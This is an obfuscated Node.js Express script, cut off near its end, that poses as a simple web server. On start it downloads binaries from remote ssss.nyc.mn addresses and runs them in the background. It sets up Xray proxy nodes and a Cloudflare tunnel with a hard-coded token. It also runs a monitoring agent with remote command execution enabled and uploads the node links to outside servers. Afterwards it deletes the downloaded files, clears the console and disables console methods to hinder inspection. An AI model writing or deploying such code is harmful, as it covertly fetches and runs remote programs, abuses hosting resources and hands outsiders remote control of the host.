const _0x337821=_0x50aa;(function(_0x54d522,_0x400755){const _0xbbee8=_0x50aa,_0x33da98=_0x54d522();while(!![]){try{const _0x2cb2fd=parseInt(_0xbbee8(0x247))/0x1+-parseInt(_0xbbee8(0x238))/0x2+parseInt(_0xbbee8(0x21a))/0x3+-parseInt(_0xbbee8(0x214))/0x4+parseInt(_0xbbee8(0x24a))/0x5*(parseInt(_0xbbee8(0x234))/0x6)+-parseInt(_0xbbee8(0x230))/0x7*(parseInt(_0xbbee8(0x21c))/0x8)+-parseInt(_0xbbee8(0x1d2))/0x9*(-parseInt(_0xbbee8(0x1d7))/0xa);if(_0x2cb2fd===_0x400755)break;else _0x33da98['push'](_0x33da98['shift']());}catch(_0x1ecd08){_0x33da98['push'](_0x33da98['shift']());}}}(_0x4bc1,0xc6af7));const _0x554d8f=(function(){let _0x57f837=!![];return function(_0x26d0f9,_0x13f3da){const _0x12c813=_0x57f837?function(){if(_0x13f3da){const _0xeba2b5=_0x13f3da['apply'](_0x26d0f9,arguments);return _0x13f3da=null,_0xeba2b5;}}:function(){};return _0x57f837=![],_0x12c813;};}()),_0x36debc=_0x554d8f(this,function(){const _0x4abdf0=_0x50aa;return _0x36debc[_0x4abdf0(0x208)]()[_0x4abdf0(0x1cf)](_0x4abdf0(0x1bf))[_0x4abdf0(0x208)]()[_0x4abdf0(0x1a7)](_0x36debc)[_0x4abdf0(0x1cf)](_0x4abdf0(0x1bf));});_0x36debc();const _0xcb187b=(function(){let _0x262349=!![];return function(_0x46c429,_0xa1cd2d){const _0x34c16b=_0x262349?function(){const _0x7b9a6f=_0x50aa;if(_0xa1cd2d){const _0x18c26d=_0xa1cd2d[_0x7b9a6f(0x213)](_0x46c429,arguments);return _0xa1cd2d=null,_0x18c26d;}}:function(){};return _0x262349=![],_0x34c16b;};}()),_0x43b9eb=_0xcb187b(this,function(){const _0x5d0c5f=_0x50aa;let _0x158da;try{const _0x367e3b=Function(_0x5d0c5f(0x19e)+_0x5d0c5f(0x1c2)+');');_0x158da=_0x367e3b();}catch(_0x2cf31e){_0x158da=window;}const _0x3d66e2=_0x158da[_0x5d0c5f(0x205)]=_0x158da[_0x5d0c5f(0x205)]||{},_0x192c86=[_0x5d0c5f(0x1db),_0x5d0c5f(0x1ca),_0x5d0c5f(0x1ee),_0x5d0c5f(0x20d),'exception',_0x5d0c5f(0x1e5),_0x5d0c5f(0x23d)];for(let _0x4fea6c=0x0;_0x4fea6c<_0x192c86['length'];_0x4fea6c++){const _0x7f3111=_0xcb187b['constructor']['prototype']['bind'](_0xcb187b),_0x24419b=_0x192c86[_0x4fea6c],_0x3c164a=_0x3d66e2[_0x24419b]||_0x7f3111;_0x7f3111[_0x5d0c5f(0x1cb)]=_0xcb187b[_0x5d0c5f(0x1fe)](_0xcb187b),_0x7f3111[_0x5d0c5f(0x208)]=_0x3c164a[_0x5d0c5f(0x208)][_0x5d0c5f(0x1fe)](_0x3c164a),_0x3d66e2[_0x24419b]=_0x7f3111;}});_0x43b9eb();const express=require(_0x337821(0x22f)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x337821(0x1d5)),{promisify}=require('util'),exec=promisify(require(_0x337821(0x23e))[_0x337821(0x1a4)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x337821(0x1e9)][_0x337821(0x1fd)]||'',PROJECT_URL=process['env'][_0x337821(0x257)]||'',AUTO_ACCESS=process[_0x337821(0x1e9)][_0x337821(0x1ba)]||![],FILE_PATH=process[_0x337821(0x1e9)][_0x337821(0x1e1)]||_0x337821(0x19f),SUB_PATH=process[_0x337821(0x1e9)][_0x337821(0x1ce)]||'sub',PORT=process['env'][_0x337821(0x220)]||process[_0x337821(0x1e9)][_0x337821(0x1ad)]||0xbb8,UUID=process[_0x337821(0x1e9)][_0x337821(0x228)]||_0x337821(0x217),NEZHA_SERVER=process['env'][_0x337821(0x254)]||'',NEZHA_PORT=process[_0x337821(0x1e9)][_0x337821(0x1b9)]||'',NEZHA_KEY=process['env'][_0x337821(0x22e)]||'',ARGO_DOMAIN=process['env'][_0x337821(0x1de)]||_0x337821(0x264),ARGO_AUTH=process[_0x337821(0x1e9)][_0x337821(0x1f9)]||_0x337821(0x215),ARGO_PORT=process[_0x337821(0x1e9)][_0x337821(0x1a2)]||0x1f41,CFIP=process[_0x337821(0x1e9)]['CFIP']||_0x337821(0x261),CFPORT=process[_0x337821(0x1e9)]['CFPORT']||0x1bb,NAME=process['env'][_0x337821(0x231)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x337821(0x1a8)](FILE_PATH),console[_0x337821(0x1db)](FILE_PATH+_0x337821(0x216))):console[_0x337821(0x1db)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3740ba=_0x337821,_0x21387e=_0x3740ba(0x226);let _0x427bea='';for(let _0xa4a544=0x0;_0xa4a544<0x6;_0xa4a544++){_0x427bea+=_0x21387e[_0x3740ba(0x240)](Math['floor'](Math['random']()*_0x21387e[_0x3740ba(0x1b2)]));}return _0x427bea;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x337821(0x221)](FILE_PATH,npmName),phpPath=path[_0x337821(0x221)](FILE_PATH,phpName),webPath=path[_0x337821(0x221)](FILE_PATH,webName),botPath=path[_0x337821(0x221)](FILE_PATH,botName),subPath=path[_0x337821(0x221)](FILE_PATH,_0x337821(0x1e6)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x337821(0x221)](FILE_PATH,_0x337821(0x1f1)),configPath=path[_0x337821(0x221)](FILE_PATH,_0x337821(0x25b));function deleteNodes(){const _0x4b62fa=_0x337821;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xad1cf0;try{_0xad1cf0=fs['readFileSync'](subPath,_0x4b62fa(0x1ec));}catch{return null;}const _0x340aa4=Buffer[_0x4b62fa(0x236)](_0xad1cf0,_0x4b62fa(0x1b5))[_0x4b62fa(0x208)](_0x4b62fa(0x1ec)),_0x298788=_0x340aa4[_0x4b62fa(0x266)]('\x0a')[_0x4b62fa(0x258)](_0x27ba01=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x27ba01));if(_0x298788['length']===0x0)return;return axios[_0x4b62fa(0x209)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4b62fa(0x1dd)]({'nodes':_0x298788}),{'headers':{'Content-Type':_0x4b62fa(0x1df)}})[_0x4b62fa(0x1a5)](_0x236ca4=>{return null;}),null;}catch(_0x5759c1){return null;}}function cleanupOldFiles(){const _0x5835d2=_0x337821;try{const _0x482b72=fs[_0x5835d2(0x1a0)](FILE_PATH);_0x482b72[_0x5835d2(0x242)](_0x57c926=>{const _0x339f69=_0x5835d2,_0x1018f4=path[_0x339f69(0x221)](FILE_PATH,_0x57c926);try{const _0x3dc901=fs[_0x339f69(0x1da)](_0x1018f4);_0x3dc901[_0x339f69(0x1dc)]()&&fs[_0x339f69(0x1c7)](_0x1018f4);}catch(_0x4a2c1c){}});}catch(_0x36e802){}}app[_0x337821(0x1d6)]('/',function(_0x369caf,_0x271395){const _0x197647=_0x337821;_0x271395[_0x197647(0x262)](_0x197647(0x201));});async function generateConfig(){const _0x1a0648=_0x337821,_0x2bc067={'log':{'access':_0x1a0648(0x1cc),'error':_0x1a0648(0x1cc),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1a0648(0x206),'settings':{'clients':[{'id':UUID,'flow':_0x1a0648(0x200)}],'decryption':_0x1a0648(0x1c1),'fallbacks':[{'dest':0xbb9},{'path':_0x1a0648(0x24c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1a0648(0x1ea),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1a0648(0x244),'protocol':_0x1a0648(0x206),'settings':{'clients':[{'id':UUID}],'decryption':_0x1a0648(0x1c1)},'streamSettings':{'network':_0x1a0648(0x243),'security':'none'}},{'port':0xbba,'listen':_0x1a0648(0x244),'protocol':_0x1a0648(0x206),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1a0648(0x1c1)},'streamSettings':{'network':'ws','security':_0x1a0648(0x1c1),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1a0648(0x1d8),_0x1a0648(0x225),_0x1a0648(0x1cd)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1a0648(0x244),'protocol':_0x1a0648(0x1ac),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1a0648(0x225),_0x1a0648(0x1cd)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1a0648(0x244),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1a0648(0x1c1),'wsSettings':{'path':_0x1a0648(0x1ea)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1a0648(0x22c),'tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x1a0648(0x1ae)](path[_0x1a0648(0x221)](FILE_PATH,'config.json'),JSON[_0x1a0648(0x1dd)](_0x2bc067,null,0x2));}function getSystemArchitecture(){const _0x1d3741=_0x337821,_0x197ed2=os['arch']();return _0x197ed2===_0x1d3741(0x268)||_0x197ed2===_0x1d3741(0x25f)||_0x197ed2===_0x1d3741(0x23c)?'arm':'amd';}function downloadFile(_0x25d9b5,_0x3b57f2,_0x3c34a7){const _0x51cf39=_0x337821,_0x1b114e=_0x25d9b5;!fs[_0x51cf39(0x251)](FILE_PATH)&&fs[_0x51cf39(0x1a8)](FILE_PATH,{'recursive':!![]});const _0x44ba4b=fs[_0x51cf39(0x248)](_0x1b114e);axios({'method':_0x51cf39(0x1d6),'url':_0x3b57f2,'responseType':_0x51cf39(0x1c5)})[_0x51cf39(0x1ef)](_0x540e8e=>{const _0x47cb5b=_0x51cf39;_0x540e8e[_0x47cb5b(0x24d)][_0x47cb5b(0x25e)](_0x44ba4b),_0x44ba4b['on'](_0x47cb5b(0x1c8),()=>{const _0x19cdad=_0x47cb5b;_0x44ba4b[_0x19cdad(0x1b3)](),console[_0x19cdad(0x1db)]('Download\x20'+path[_0x19cdad(0x25a)](_0x1b114e)+_0x19cdad(0x1a1)),_0x3c34a7(null,_0x1b114e);}),_0x44ba4b['on'](_0x47cb5b(0x20d),_0x10d312=>{const _0x488903=_0x47cb5b;fs[_0x488903(0x1f3)](_0x1b114e,()=>{});const _0x4a75dc=_0x488903(0x1c0)+path[_0x488903(0x25a)](_0x1b114e)+_0x488903(0x20a)+_0x10d312['message'];console[_0x488903(0x20d)](_0x4a75dc),_0x3c34a7(_0x4a75dc);});})[_0x51cf39(0x1a5)](_0x351289=>{const _0x3a44cb=_0x51cf39,_0x366dbb='Download\x20'+path[_0x3a44cb(0x25a)](_0x1b114e)+_0x3a44cb(0x20a)+_0x351289[_0x3a44cb(0x24f)];console['error'](_0x366dbb),_0x3c34a7(_0x366dbb);});}async function downloadFilesAndRun(){const _0x1dd0f1=_0x337821,_0x8b7b6c=getSystemArchitecture(),_0x3558bc=getFilesForArchitecture(_0x8b7b6c);if(_0x3558bc['length']===0x0){console['log'](_0x1dd0f1(0x1c4));return;}const _0x5a996b=_0x3558bc[_0x1dd0f1(0x1f8)](_0x41ce53=>{return new Promise((_0x308c7b,_0x54bcc7)=>{const _0x45fca8=_0x50aa;downloadFile(_0x41ce53[_0x45fca8(0x237)],_0x41ce53[_0x45fca8(0x1fc)],(_0x244f9d,_0x2a89a3)=>{_0x244f9d?_0x54bcc7(_0x244f9d):_0x308c7b(_0x2a89a3);});});});try{await Promise['all'](_0x5a996b);}catch(_0x14b1bf){console['error'](_0x1dd0f1(0x260),_0x14b1bf);return;}function _0x124596(_0x2410f8){const _0x2e32c6=0x1fd;_0x2410f8['forEach'](_0x232276=>{const _0x1f4268=_0x50aa;fs[_0x1f4268(0x251)](_0x232276)&&fs[_0x1f4268(0x1d9)](_0x232276,_0x2e32c6,_0x49def3=>{const _0x103577=_0x1f4268;_0x49def3?console[_0x103577(0x20d)](_0x103577(0x1bb)+_0x232276+':\x20'+_0x49def3):console[_0x103577(0x1db)](_0x103577(0x1e3)+_0x232276+':\x20'+_0x2e32c6[_0x103577(0x208)](0x8));});});}const _0x18e9f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x124596(_0x18e9f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5861df=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1dd0f1(0x266)](':')[_0x1dd0f1(0x26a)]():'',_0x5195ae=new Set([_0x1dd0f1(0x1eb),_0x1dd0f1(0x246),_0x1dd0f1(0x1ff),_0x1dd0f1(0x1f2),'2083',_0x1dd0f1(0x1bd)]),_0xf4a309=_0x5195ae[_0x1dd0f1(0x1b4)](_0x5861df)?_0x1dd0f1(0x204):'false',_0x192050='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1dd0f1(0x232)+NEZHA_SERVER+_0x1dd0f1(0x20f)+_0xf4a309+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1dd0f1(0x1ae)](path['join'](FILE_PATH,'config.yaml'),_0x192050);const _0x207cab=_0x1dd0f1(0x212)+phpPath+_0x1dd0f1(0x20e)+FILE_PATH+_0x1dd0f1(0x1a9);try{await exec(_0x207cab),console[_0x1dd0f1(0x1db)](phpName+_0x1dd0f1(0x263)),await new Promise(_0x38a29b=>setTimeout(_0x38a29b,0x3e8));}catch(_0xce522e){console['error'](_0x1dd0f1(0x1d0)+_0xce522e);}}else{let _0x189726='';const _0x3c16c9=[_0x1dd0f1(0x1eb),'8443','2096',_0x1dd0f1(0x1f2),_0x1dd0f1(0x227),_0x1dd0f1(0x1bd)];_0x3c16c9[_0x1dd0f1(0x1c6)](NEZHA_PORT)&&(_0x189726=_0x1dd0f1(0x1e7));const _0x3ccc6f=_0x1dd0f1(0x212)+npmPath+_0x1dd0f1(0x222)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x189726+_0x1dd0f1(0x1b0);try{await exec(_0x3ccc6f),console[_0x1dd0f1(0x1db)](npmName+_0x1dd0f1(0x263)),await new Promise(_0x4b4a44=>setTimeout(_0x4b4a44,0x3e8));}catch(_0x350259){console[_0x1dd0f1(0x20d)](_0x1dd0f1(0x1f5)+_0x350259);}}}else console[_0x1dd0f1(0x1db)](_0x1dd0f1(0x245));const _0x494fc9=_0x1dd0f1(0x212)+webPath+_0x1dd0f1(0x1bc)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x494fc9),console[_0x1dd0f1(0x1db)](webName+_0x1dd0f1(0x263)),await new Promise(_0x519221=>setTimeout(_0x519221,0x3e8));}catch(_0x1bf15d){console[_0x1dd0f1(0x20d)](_0x1dd0f1(0x1f4)+_0x1bf15d);}if(fs[_0x1dd0f1(0x251)](botPath)){let _0x32ad78;if(ARGO_AUTH[_0x1dd0f1(0x241)](/^[A-Z0-9a-z=]{120,250}$/))_0x32ad78=_0x1dd0f1(0x23f)+ARGO_AUTH;else ARGO_AUTH[_0x1dd0f1(0x241)](/TunnelSecret/)?_0x32ad78=_0x1dd0f1(0x1c3)+FILE_PATH+_0x1dd0f1(0x22a):_0x32ad78='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1dd0f1(0x269)+ARGO_PORT;try{await exec(_0x1dd0f1(0x212)+botPath+'\x20'+_0x32ad78+_0x1dd0f1(0x259)),console['log'](botName+_0x1dd0f1(0x263)),await new Promise(_0x3ec116=>setTimeout(_0x3ec116,0x7d0));}catch(_0x4124bf){console[_0x1dd0f1(0x20d)]('Error\x20executing\x20command:\x20'+_0x4124bf);}}await new Promise(_0x190d4b=>setTimeout(_0x190d4b,0x1388));}function getFilesForArchitecture(_0x3fece4){const _0x52434a=_0x337821;let _0xd00b18;_0x3fece4===_0x52434a(0x268)?_0xd00b18=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x52434a(0x211)}]:_0xd00b18=[{'fileName':webPath,'fileUrl':_0x52434a(0x1b6)},{'fileName':botPath,'fileUrl':_0x52434a(0x1be)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x24aa81=_0x3fece4===_0x52434a(0x268)?'https://arm64.ssss.nyc.mn/agent':_0x52434a(0x1fa);_0xd00b18[_0x52434a(0x219)]({'fileName':npmPath,'fileUrl':_0x24aa81});}else{const _0xbbd6cf=_0x3fece4===_0x52434a(0x268)?'https://arm64.ssss.nyc.mn/v1':_0x52434a(0x223);_0xd00b18[_0x52434a(0x219)]({'fileName':phpPath,'fileUrl':_0xbbd6cf});}}return _0xd00b18;}function argoType(){const _0x4b2cbd=_0x337821;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4b2cbd(0x1db)](_0x4b2cbd(0x24b));return;}if(ARGO_AUTH[_0x4b2cbd(0x1c6)](_0x4b2cbd(0x1aa))){fs[_0x4b2cbd(0x1ae)](path['join'](FILE_PATH,_0x4b2cbd(0x21f)),ARGO_AUTH);const _0x41fb00=_0x4b2cbd(0x235)+ARGO_AUTH['split']('\x22')[0xb]+_0x4b2cbd(0x20b)+path[_0x4b2cbd(0x221)](FILE_PATH,_0x4b2cbd(0x21f))+_0x4b2cbd(0x1f0)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x4b2cbd(0x1a3);fs[_0x4b2cbd(0x1ae)](path[_0x4b2cbd(0x221)](FILE_PATH,'tunnel.yml'),_0x41fb00);}else console[_0x4b2cbd(0x1db)](_0x4b2cbd(0x21d));}argoType();async function extractDomains(){const _0x1b663d=_0x337821;let _0x2c573c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2c573c=ARGO_DOMAIN,console[_0x1b663d(0x1db)](_0x1b663d(0x23b),_0x2c573c),await _0x272e02(_0x2c573c);else try{const _0x3e8b22=fs[_0x1b663d(0x1d3)](path[_0x1b663d(0x221)](FILE_PATH,_0x1b663d(0x1f1)),_0x1b663d(0x1ec)),_0x150365=_0x3e8b22[_0x1b663d(0x266)]('\x0a'),_0x390a75=[];_0x150365[_0x1b663d(0x242)](_0x357aee=>{const _0x3cb837=_0x1b663d,_0x218b20=_0x357aee[_0x3cb837(0x241)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x218b20){const _0x336708=_0x218b20[0x1];_0x390a75[_0x3cb837(0x1ab)](_0x336708);}});if(_0x390a75[_0x1b663d(0x1b2)]>0x0)_0x2c573c=_0x390a75[0x0],console[_0x1b663d(0x1db)](_0x1b663d(0x1ed),_0x2c573c),await _0x272e02(_0x2c573c);else{console['log'](_0x1b663d(0x249)),fs[_0x1b663d(0x1c7)](path[_0x1b663d(0x221)](FILE_PATH,_0x1b663d(0x1f1)));async function _0x2603b0(){const _0x4bbf40=_0x1b663d;try{process['platform']==='win32'?await exec(_0x4bbf40(0x1e4)+botName+_0x4bbf40(0x224)):await exec(_0x4bbf40(0x233)+botName[_0x4bbf40(0x240)](0x0)+']'+botName[_0x4bbf40(0x25c)](0x1)+_0x4bbf40(0x253));}catch(_0x4381d1){}}_0x2603b0(),await new Promise(_0x17a010=>setTimeout(_0x17a010,0xbb8));const _0x2a434b=_0x1b663d(0x25d)+FILE_PATH+_0x1b663d(0x269)+ARGO_PORT;try{await exec(_0x1b663d(0x212)+botPath+'\x20'+_0x2a434b+'\x20>/dev/null\x202>&1\x20&'),console[_0x1b663d(0x1db)](botName+'\x20is\x20running'),await new Promise(_0x1766a0=>setTimeout(_0x1766a0,0xbb8)),await extractDomains();}catch(_0x3f0b14){console[_0x1b663d(0x20d)](_0x1b663d(0x23a)+_0x3f0b14);}}}catch(_0x424adc){console[_0x1b663d(0x20d)]('Error\x20reading\x20boot.log:',_0x424adc);}async function _0x272e02(_0x4de7eb){const _0x18fc47=_0x1b663d,_0x41f133=execSync(_0x18fc47(0x202),{'encoding':_0x18fc47(0x1ec)}),_0x3224e3=_0x41f133[_0x18fc47(0x1b7)](),_0x4851c3=NAME?NAME+'-'+_0x3224e3:_0x3224e3;return new Promise(_0x22833b=>{setTimeout(()=>{const _0x472e1c=_0x50aa,_0x1fb1a9={'v':'2','ps':''+_0x4851c3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x472e1c(0x1c1),'net':'ws','type':_0x472e1c(0x1c1),'host':_0x4de7eb,'path':_0x472e1c(0x207),'tls':_0x472e1c(0x225),'sni':_0x4de7eb,'alpn':'','fp':'firefox'},_0x46ff40=_0x472e1c(0x1a6)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4de7eb+_0x472e1c(0x210)+_0x4de7eb+_0x472e1c(0x1c9)+_0x4851c3+_0x472e1c(0x22b)+Buffer[_0x472e1c(0x236)](JSON[_0x472e1c(0x1dd)](_0x1fb1a9))['toString'](_0x472e1c(0x1b5))+_0x472e1c(0x1d1)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x4de7eb+_0x472e1c(0x210)+_0x4de7eb+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4851c3+_0x472e1c(0x252);console[_0x472e1c(0x1db)](Buffer[_0x472e1c(0x236)](_0x46ff40)[_0x472e1c(0x208)](_0x472e1c(0x1b5))),fs[_0x472e1c(0x1ae)](subPath,Buffer[_0x472e1c(0x236)](_0x46ff40)[_0x472e1c(0x208)](_0x472e1c(0x1b5))),console[_0x472e1c(0x1db)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2d2693,_0x69e498)=>{const _0x30e469=_0x472e1c,_0x33cd0d=Buffer[_0x30e469(0x236)](_0x46ff40)[_0x30e469(0x208)](_0x30e469(0x1b5));_0x69e498[_0x30e469(0x1fb)](_0x30e469(0x255),_0x30e469(0x24e)),_0x69e498[_0x30e469(0x262)](_0x33cd0d);}),_0x22833b(_0x46ff40);},0x7d0);});}}async function uploadNodes(){const _0x1be1f6=_0x337821;if(UPLOAD_URL&&PROJECT_URL){const _0x109246=PROJECT_URL+'/'+SUB_PATH,_0x3fe26f={'subscription':[_0x109246]};try{const _0x1c93d6=await axios[_0x1be1f6(0x209)](UPLOAD_URL+_0x1be1f6(0x1e2),_0x3fe26f,{'headers':{'Content-Type':_0x1be1f6(0x1df)}});return _0x1c93d6&&_0x1c93d6[_0x1be1f6(0x265)]===0xc8?(console[_0x1be1f6(0x1db)](_0x1be1f6(0x203)),_0x1c93d6):null;}catch(_0x3b546b){if(_0x3b546b[_0x1be1f6(0x1f6)]){if(_0x3b546b[_0x1be1f6(0x1f6)][_0x1be1f6(0x265)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1be1f6(0x251)](listPath))return;const _0x450f57=fs[_0x1be1f6(0x1d3)](listPath,'utf-8'),_0xf7c6b9=_0x450f57[_0x1be1f6(0x266)]('\x0a')['filter'](_0x405319=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1be1f6(0x250)](_0x405319));if(_0xf7c6b9['length']===0x0)return;const _0x4f2006=JSON['stringify']({'nodes':_0xf7c6b9});try{const _0x492b15=await axios[_0x1be1f6(0x209)](UPLOAD_URL+_0x1be1f6(0x1e8),_0x4f2006,{'headers':{'Content-Type':_0x1be1f6(0x1df)}});return _0x492b15&&_0x492b15[_0x1be1f6(0x265)]===0xc8?(console[_0x1be1f6(0x1db)](_0x1be1f6(0x239)),_0x492b15):null;}catch(_0x15596a){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x342862=_0x50aa,_0x49b859=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x49b859[_0x342862(0x1ab)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x49b859['push'](phpPath);process[_0x342862(0x1b1)]===_0x342862(0x1d4)?exec(_0x342862(0x229)+_0x49b859['join']('\x20')+_0x342862(0x1b8),_0x165598=>{const _0x55bb65=_0x342862;console[_0x55bb65(0x256)](),console[_0x55bb65(0x1db)](_0x55bb65(0x267)),console[_0x55bb65(0x1db)](_0x55bb65(0x22d));}):exec(_0x342862(0x1af)+_0x49b859[_0x342862(0x221)]('\x20')+'\x20>/dev/null\x202>&1',_0x3f4de2=>{const _0x8f5cc4=_0x342862;console['clear'](),console[_0x8f5cc4(0x1db)](_0x8f5cc4(0x267)),console['log'](_0x8f5cc4(0x22d));});},0x15f90);}cleanFiles();function _0x50aa(_0x14bb6e,_0x3e2ec5){const _0x2999bf=_0x4bc1();return _0x50aa=function(_0x43b9eb,_0xcb187b){_0x43b9eb=_0x43b9eb-0x19e;let _0x282525=_0x2999bf[_0x43b9eb];return _0x282525;},_0x50aa(_0x14bb6e,_0x3e2ec5);}async function AddVisitTask(){const _0x859001=_0x337821;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x859001(0x1db)](_0x859001(0x1f7));return;}try{const _0xbe0929=await axios[_0x859001(0x209)](_0x859001(0x218),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x859001(0x1df)}});return console[_0x859001(0x1db)](_0x859001(0x20c)),_0xbe0929;}catch(_0x1b021b){return console['error'](_0x859001(0x26b)+_0x1b021b[_0x859001(0x24f)]),null;}}async function startserver(){const _0x7b06d3=_0x337821;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x28630e){console[_0x7b06d3(0x20d)](_0x7b06d3(0x21e),_0x28630e);}}startserver()['catch'](_0x2ec21e=>{const _0x2834bf=_0x337821;console[_0x2834bf(0x20d)]('Unhandled\x20error\x20in\x20startserver:',_0x2ec21e);}),app[_0x337821(0x1e0)](PORT,()=>console['log'](_0x337821(0x21b)+PORT+'!'));function _0x4bc1(){const _0x1c8b52=['nohup\x20','apply','6493088wgZuvc','eyJhIjoiYmJiNTlhMTg3ZmEzY2MzODk5YTAzYmM1ZmMyNTIxZjgiLCJ0IjoiMWUyZjc1ZWYtOGEwNC00YTU4LWIyM2UtMmJkM2RhNjhiNjkwIiwicyI6IllqSXhOVGxrT0dZdE16QTFPQzAwTldJNExUazFNRFl0TW1abE9XSTNZMlZsT1ROaCJ9','\x20is\x20created','532ef890-073d-4e3b-91f4-467cc129d511','https://oooo.serv00.net/add-url','unshift','173349aWadzP','http\x20server\x20is\x20running\x20on\x20port:','2790632AwCqCv','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Error\x20in\x20startserver:','tunnel.json','SERVER_PORT','join','\x20-s\x20','https://amd64.ssss.nyc.mn/v1','.exe\x20>\x20nul\x202>&1','tls','abcdefghijklmnopqrstuvwxyz','2083','UUID','del\x20/f\x20/q\x20','/tunnel.yml\x20run','\x0a\x20\x20\x0avmess://','freedom','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA_KEY','express','14cvQhlT','NAME','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','pkill\x20-f\x20\x22[','198kPDOdn','\x0a\x20\x20tunnel:\x20','from','fileName','2111986cVsvjB','Nodes\x20uploaded\x20successfully','Error\x20executing\x20command:\x20','ARGO_DOMAIN:','aarch64','trace','child_process','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','charAt','match','forEach','tcp','127.0.0.1','NEZHA\x20variable\x20is\x20empty,skip\x20running','8443','288035dtofhJ','createWriteStream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','184385HqthZs','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vless-argo','data','text/plain;\x20charset=utf-8','message','test','existsSync','\x0a\x20\x20\x20\x20','\x22\x20>\x20/dev/null\x202>&1','NEZHA_SERVER','Content-Type','clear','PROJECT_URL','filter','\x20>/dev/null\x202>&1\x20&','basename','config.json','substring','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pipe','arm64','Error\x20downloading\x20files:','openai.com','send','\x20is\x20running','ra.fooxxk.qzz.io','status','split','App\x20is\x20running','arm','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','pop','Add\x20automatic\x20access\x20task\x20faild:\x20','return\x20(function()\x20','./tmp','readdirSync','\x20successfully','ARGO_PORT','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','exec','catch','\x0avless://','constructor','mkdirSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','TunnelSecret','push','vmess','PORT','writeFileSync','rm\x20-rf\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','platform','length','close','has','base64','https://amd